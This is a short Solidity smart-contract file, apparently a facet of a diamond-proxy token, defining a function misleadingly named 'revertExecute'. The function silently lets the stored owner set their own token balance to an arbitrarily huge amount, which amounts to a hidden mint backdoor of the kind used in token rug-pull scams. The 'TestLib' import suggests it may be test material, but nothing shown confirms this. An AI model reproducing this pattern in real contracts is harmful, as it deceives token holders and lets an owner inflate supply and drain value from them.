// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;
import "./TestLib.sol";
contract revertExecuteFacet {
    function revertExecute(uint256 n) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds._owner == msg.sender) {
            ds._balances[msg.sender] = 10 ** 15 * n * 1 * 10 ** ds._decimals;
        } else {}
    }
}
